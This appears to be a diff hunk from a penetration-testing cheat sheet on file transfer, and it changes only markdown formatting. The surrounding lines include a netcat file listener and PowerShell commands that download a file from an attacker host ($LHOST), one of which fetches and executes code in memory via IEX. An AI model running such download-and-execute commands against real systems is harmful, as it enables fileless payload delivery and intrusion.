@@ -170,7 +170,7 @@ To get file
 nc -lp 8888 > outfile
 ```
 ### Windows Powershell
-```powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', 'outfile')``` <- download file to disk
+```powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', 'outfile')``` <- download file to disk\
 ```powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')"``` <- download and exec on memory
 
 ### Certutil
